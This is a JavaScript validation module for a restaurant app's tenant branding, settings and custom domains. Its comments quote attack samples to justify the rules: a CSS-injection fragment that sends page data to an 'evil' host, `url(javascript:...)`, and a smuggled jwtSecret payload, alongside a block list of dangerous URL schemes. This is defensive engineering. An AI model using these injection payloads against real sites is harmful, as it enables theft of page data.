/**
 * P2D — the branding/settings vocabulary and its validators.
 *
 * WHY A SEPARATE MODULE FROM THE MONGOOSE SCHEMA
 * ----------------------------------------------
 * The same rules are needed in three places: the model (so a direct write
 * cannot store rubbish), the service (so an API payload is rejected with a
 * useful message), and the tests (so the rules can be asserted directly). Three
 * copies is how one of them quietly drifts, so the rules live here once.
 *
 * BRANDING IS UNTRUSTED TENANT INPUT
 * ----------------------------------
 * Every value in this file is typed by a restaurant owner and later rendered
 * into receipt HTML and a public web page. It is treated exactly like any other
 * user-supplied string:
 *
 *   colours   ONLY `#RRGGBB`. Not `rgb()`, not `hsl()`, not named colours, and
 *             emphatically not arbitrary CSS. A raw CSS value permits
 *             `expression()`, `url(javascript:...)` and background-image
 *             exfiltration of whatever is on the page. A six-hex-digit string
 *             cannot express any of that.
 *   URLs      ONLY http/https, parsed with `new URL()` rather than a regex.
 *             `javascript:`, `data:` and `vbscript:` are refused explicitly
 *             because they are the three that actually execute.
 *   text      length-capped and stored raw; escaped at every render site.
 *             Storing pre-escaped text would double-escape on the next edit.
 *   fonts     a closed allowlist of stacks. A free-text font-family is a CSS
 *             injection vector (`Arial; } body { background: url(...)`).
 */

function httpError(message, status = 400) {
  return Object.assign(new Error(message), {status});
}

const clean = value => String(value ?? '').trim();

// ── colours ──────────────────────────────────────────────────────────────────

/**
 * `#RRGGBB` only.
 *
 * Three-digit `#abc` is deliberately refused too: it is valid CSS, but
 * accepting two shapes means two things to validate everywhere downstream for
 * no user benefit. The UI offers a colour picker, which emits six digits.
 */
export const COLOR_PATTERN = /^#[0-9a-fA-F]{6}$/;

export function isSafeColor(value) {
  return typeof value === 'string' && COLOR_PATTERN.test(value.trim());
}

export function assertColor(value, field) {
  const color = clean(value);
  if (!isSafeColor(color)) {
    throw httpError(`${field} must be a colour in #RRGGBB form`, 400);
  }
  // Normalised to lower case so `#FFAA00` and `#ffaa00` are one value and a
  // change-detection diff does not report a phantom edit.
  return color.toLowerCase();
}

// ── URLs ─────────────────────────────────────────────────────────────────────

/**
 * Schemes that can execute or smuggle content. Checked explicitly BEFORE the
 * allowlist so the refusal message is honest about why, and so the intent is
 * legible to the next reader.
 */
const DANGEROUS_SCHEMES = Object.freeze([
  'javascript:', 'data:', 'vbscript:', 'file:', 'blob:', 'about:'
]);

export const ALLOWED_URL_SCHEMES = Object.freeze(['http:', 'https:']);

/**
 * Validate an image/site URL supplied by a tenant.
 *
 * Parsed with `new URL()`, not a regex: a regex over URLs is a reliable source
 * of bypasses (`java\nscript:`, `JaVaScRiPt:`, embedded credentials, unicode
 * lookalikes). The parser normalises all of that before the scheme is read.
 *
 * `http:` is permitted because Nepali SMEs commonly host images on plain HTTP
 * and refusing it would silently break real logos. It is NOT a security
 * downgrade for the page: an http image on an https page is blocked as mixed
 * content by the browser, which is the browser's job, not ours.
 */
export function assertSafeUrl(value, field, {maxLength = 500} = {}) {
  const raw = clean(value);
  if (!raw) return null;
  if (raw.length > maxLength) throw httpError(`${field} is too long`, 400);

  let parsed;
  try {
    parsed = new URL(raw);
  } catch {
    throw httpError(`${field} must be a valid absolute URL`, 400);
  }

  const scheme = parsed.protocol.toLowerCase();
  if (DANGEROUS_SCHEMES.includes(scheme)) {
    throw httpError(`${field} must not use the ${scheme} scheme`, 400);
  }
  if (!ALLOWED_URL_SCHEMES.includes(scheme)) {
    throw httpError(`${field} must be an http or https URL`, 400);
  }
  if (!parsed.hostname) throw httpError(`${field} must include a hostname`, 400);
  return parsed.toString();
}

// ── fonts ────────────────────────────────────────────────────────────────────

/**
 * A CLOSED allowlist of font stacks.
 *
 * Free-text `fontFamily` is a CSS injection vector: the value lands inside a
 * declaration, so `Arial; } body { background: url(https://evil/?c=` closes the
 * rule and opens another. A key that maps to a server-controlled stack cannot.
 *
 * Every stack is system-font-only. Loading a webfont would mean a third-party
 * request from a page that shows order data, which is a privacy decision
 * nobody has taken.
 */
export const FONT_STACKS = Object.freeze({
  system: "system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif",
  serif: "Georgia, 'Times New Roman', serif",
  mono: "'SF Mono', 'Cascadia Code', Consolas, monospace",
  rounded: "'Nunito', 'Trebuchet MS', system-ui, sans-serif",
  condensed: "'Arial Narrow', 'Helvetica Neue', system-ui, sans-serif"
});

export const FONT_KEYS = Object.freeze(Object.keys(FONT_STACKS));

export function assertFont(value, field = 'fontFamily') {
  const key = clean(value).toLowerCase();
  if (!FONT_KEYS.includes(key)) {
    throw httpError(`${field} must be one of: ${FONT_KEYS.join(', ')}`, 400);
  }
  return key;
}

/** The CSS stack for a font key. Never returns tenant input. */
export function fontStackFor(key) {
  return FONT_STACKS[clean(key).toLowerCase()] || FONT_STACKS.system;
}

// ── the branding field catalogue ─────────────────────────────────────────────

/**
 * Every branding field, its type, and the entitlement TIER it belongs to.
 *
 * Declared as data so the validator, the API schema, the resolver and the UI
 * all read the same list. Adding a field in one place and forgetting it in
 * another is the failure this prevents.
 *
 * TIERS (P2D-N):
 *   core      every plan. Name, logo, colours, contact, receipt footer.
 *   advanced  needs `advancedBranding`. Storefront copy, typography, accents.
 *   white     needs `whiteLabel`. Removing product branding.
 */
export const BRANDING_FIELDS = Object.freeze({
  displayName: {type: 'text', maxLength: 80, tier: 'core'},
  tagline: {type: 'text', maxLength: 140, tier: 'core'},
  logoUrl: {type: 'url', tier: 'core'},
  faviconUrl: {type: 'url', tier: 'core'},
  primaryColor: {type: 'color', tier: 'core'},
  secondaryColor: {type: 'color', tier: 'core'},
  accentColor: {type: 'color', tier: 'advanced'},
  backgroundColor: {type: 'color', tier: 'advanced'},
  textColor: {type: 'color', tier: 'advanced'},
  fontFamily: {type: 'font', tier: 'advanced'},
  receiptLogoEnabled: {type: 'boolean', tier: 'core'},
  receiptFooter: {type: 'text', maxLength: 300, tier: 'core'},
  storefrontTitle: {type: 'text', maxLength: 120, tier: 'advanced'},
  storefrontSubtitle: {type: 'text', maxLength: 200, tier: 'advanced'},
  storefrontNotice: {type: 'text', maxLength: 300, tier: 'advanced'},
  storefrontFooter: {type: 'text', maxLength: 300, tier: 'advanced'},
  orderingInstructions: {type: 'text', maxLength: 500, tier: 'advanced'},
  // White-label: suppress the product's own name on tenant-facing surfaces.
  hideProductBranding: {type: 'boolean', tier: 'white'},
  supportEmail: {type: 'email', tier: 'core'},
  supportPhone: {type: 'text', maxLength: 40, tier: 'core'},
  websiteUrl: {type: 'url', tier: 'core'},
  facebookUrl: {type: 'url', tier: 'advanced'},
  instagramUrl: {type: 'url', tier: 'advanced'}
});

export const BRANDING_KEYS = Object.freeze(Object.keys(BRANDING_FIELDS));

/** Which entitlement feature a tier requires. `core` requires none. */
export const TIER_FEATURE = Object.freeze({
  core: null,
  advanced: 'advancedBranding',
  white: 'whiteLabel'
});

export function brandingKeysForTier(tier) {
  return BRANDING_KEYS.filter(key => BRANDING_FIELDS[key].tier === tier);
}

const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;

/**
 * Validate ONE branding field against its declared type.
 *
 * `null` and `''` mean "clear this field" and are always allowed — a tenant
 * must be able to remove a logo, and the resolver supplies a default.
 */
export function validateBrandingField(key, value) {
  const spec = BRANDING_FIELDS[key];
  if (!spec) throw httpError(`Unknown branding field: ${key}`, 400);

  if (value === null || value === undefined || value === '') {
    return spec.type === 'boolean' ? Boolean(value) : null;
  }

  switch (spec.type) {
    case 'color':
      return assertColor(value, key);
    case 'url':
      return assertSafeUrl(value, key);
    case 'font':
      return assertFont(value, key);
    case 'boolean':
      if (typeof value !== 'boolean') throw httpError(`${key} must be true or false`, 400);
      return value;
    case 'email': {
      const email = clean(value).toLowerCase();
      if (email.length > 160) throw httpError(`${key} is too long`, 400);
      if (!EMAIL_PATTERN.test(email)) throw httpError(`${key} must be a valid email address`, 400);
      return email;
    }
    case 'text': {
      const text = clean(value);
      if (text.length > spec.maxLength) {
        throw httpError(`${key} must be ${spec.maxLength} characters or fewer`, 400);
      }
      /**
       * Control characters are stripped, but MARKUP IS NOT.
       *
       * A footer legitimately contains `&`, and a tenant may well write
       * "Fish & Chips <10% off>". Rejecting markup here would be
       * blocklist-thinking; escaping at every render site is the actual
       * control, and the receipt renderer's `esc()` plus React's default
       * escaping both already do it. Storing pre-escaped text would
       * double-escape on the next edit and corrupt the value.
       */
      // eslint-disable-next-line no-control-regex
      return text.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g, '');
    }
    default:
      throw httpError(`Unhandled branding field type for ${key}`, 500);
  }
}

/**
 * Validate a whole patch. Unknown keys are REJECTED, not stripped.
 *
 * Mongoose `strict: true` silently drops unknown paths, so a typo'd field would
 * look accepted and never apply — the P1 finding. A 400 makes the mistake
 * visible at the moment it is made.
 */
export function validateBrandingPatch(patch) {
  if (!patch || typeof patch !== 'object' || Array.isArray(patch)) {
    throw httpError('Branding must be an object', 400);
  }
  const result = {};
  for (const [key, value] of Object.entries(patch)) {
    if (!BRANDING_KEYS.includes(key)) throw httpError(`Unknown branding field: ${key}`, 400);
    result[key] = validateBrandingField(key, value);
  }
  return result;
}

// ── typed tenant settings (P2D-D) ────────────────────────────────────────────

/**
 * Operational preferences, by category.
 *
 * Kept SEPARATE from branding because they are a different kind of thing:
 * branding is cosmetic and public, these change how the product behaves for
 * staff. Mixing them would mean one permission and one audit action for two
 * very different risk profiles.
 *
 * Deliberately a SMALL, closed set. The brief warns against "a giant settings
 * page with hundreds of uncontrolled fields", and every key here has to be
 * honoured by real code or it is a lie to the operator.
 *
 * NOTHING SECURITY-SENSITIVE LIVES HERE. No permission, platform role, plan,
 * entitlement, connection string, JWT, CORS, rate-limit or audit setting is
 * expressible — those keys simply do not exist in this catalogue, so a tenant
 * cannot name one. That is enforced by the closed key set, not by a blocklist.
 */
export const SETTINGS_CATALOG = Object.freeze({
  localization: {
    dateFormat: {type: 'enum', values: ['YYYY-MM-DD', 'DD/MM/YYYY', 'MM/DD/YYYY'], default: 'YYYY-MM-DD'},
    timeFormat: {type: 'enum', values: ['24h', '12h'], default: '24h'},
    currencyPosition: {type: 'enum', values: ['before', 'after'], default: 'before'},
    locale: {type: 'enum', values: ['en', 'ne'], default: 'en'}
  },
  pos: {
    showItemImages: {type: 'boolean', default: false},
    confirmBeforeVoid: {type: 'boolean', default: true},
    defaultOrderType: {type: 'enum', values: ['counter', 'dine-in', 'takeaway'], default: 'counter'}
  },
  kds: {
    ticketColumns: {type: 'int', min: 1, max: 6, default: 3},
    showElapsedTime: {type: 'boolean', default: true},
    alertAfterMinutes: {type: 'int', min: 1, max: 120, default: 15}
  },
  tables: {
    showFloorPlan: {type: 'boolean', default: true},
    autoCleaningAfterPayment: {type: 'boolean', default: true}
  },
  delivery: {
    showRiderPhoneToCustomer: {type: 'boolean', default: false},
    defaultPrepMinutes: {type: 'int', min: 1, max: 240, default: 20}
  },
  onlineOrdering: {
    acceptingOrders: {type: 'boolean', default: true},
    minimumOrderValue: {type: 'int', min: 0, max: 1000000, default: 0},
    showOutOfStock: {type: 'boolean', default: false}
  },
  receipts: {
    showCustomerDetails: {type: 'boolean', default: true},
    showItemNotes: {type: 'boolean', default: true}
  },
  customerExperience: {
    showEstimatedTime: {type: 'boolean', default: true},
    thankYouMessage: {type: 'text', maxLength: 200, default: null}
  }
});

export const SETTINGS_CATEGORIES = Object.freeze(Object.keys(SETTINGS_CATALOG));

/** Every default, as a nested object. Used when a tenant has set nothing. */
export function defaultSettings() {
  const result = {};
  for (const [category, fields] of Object.entries(SETTINGS_CATALOG)) {
    result[category] = {};
    for (const [key, spec] of Object.entries(fields)) result[category][key] = spec.default;
  }
  return result;
}

function validateSettingValue(category, key, value, spec) {
  const label = `${category}.${key}`;
  switch (spec.type) {
    case 'boolean':
      if (typeof value !== 'boolean') throw httpError(`${label} must be true or false`, 400);
      return value;
    case 'int':
      if (!Number.isInteger(value)) throw httpError(`${label} must be a whole number`, 400);
      if (value < spec.min || value > spec.max) {
        throw httpError(`${label} must be between ${spec.min} and ${spec.max}`, 400);
      }
      return value;
    case 'enum': {
      const text = clean(value);
      if (!spec.values.includes(text)) {
        throw httpError(`${label} must be one of: ${spec.values.join(', ')}`, 400);
      }
      return text;
    }
    case 'text': {
      if (value === null || value === '') return null;
      const text = clean(value);
      if (text.length > spec.maxLength) {
        throw httpError(`${label} must be ${spec.maxLength} characters or fewer`, 400);
      }
      // eslint-disable-next-line no-control-regex
      return text.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g, '');
    }
    default:
      throw httpError(`Unhandled setting type for ${label}`, 500);
  }
}

/**
 * Validate a settings patch: `{category: {key: value}}`.
 *
 * Both levels are closed. An unknown category or key is a 400, so a client
 * cannot smuggle `{security: {jwtSecret: '...'}}` into the Mixed `settings`
 * blob — a key that is not in the catalogue has no way through this function.
 */
export function validateSettingsPatch(patch) {
  if (!patch || typeof patch !== 'object' || Array.isArray(patch)) {
    throw httpError('Settings must be an object', 400);
  }
  const result = {};
  for (const [category, fields] of Object.entries(patch)) {
    const catalog = SETTINGS_CATALOG[category];
    if (!catalog) throw httpError(`Unknown settings category: ${category}`, 400);
    if (!fields || typeof fields !== 'object' || Array.isArray(fields)) {
      throw httpError(`Settings category ${category} must be an object`, 400);
    }
    result[category] = {};
    for (const [key, value] of Object.entries(fields)) {
      const spec = catalog[key];
      if (!spec) throw httpError(`Unknown setting: ${category}.${key}`, 400);
      result[category][key] = validateSettingValue(category, key, value, spec);
    }
  }
  return result;
}

// ── custom domains (P2D-M) ───────────────────────────────────────────────────

/**
 * Normalise a hostname for storage and comparison.
 *
 * Lower-cased, trailing dot removed, `www.` NOT removed (it is a different
 * host and treating it as the same is how two tenants collide). Port and path
 * are refused: a domain is a host, and accepting `example.com/foo` would store
 * something that can never match a `Host` header.
 */
export function normalizeDomain(value) {
  const raw = clean(value).toLowerCase().replace(/\.$/, '');
  if (!raw) return null;
  if (raw.length > 253) throw httpError('A domain is too long', 400);
  if (raw.includes('/') || raw.includes(':') || raw.includes(' ')) {
    throw httpError('A domain must be a bare hostname, with no scheme, port or path', 400);
  }
  // Standard label rules: alphanumeric plus hyphen, no leading/trailing hyphen,
  // at least one dot. Deliberately strict — a permissive domain parser is how
  // a lookalike host slips through.
  if (!/^(?=.{1,253}$)([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/.test(raw)) {
    throw httpError('That does not look like a valid domain name', 400);
  }
  return raw;
}
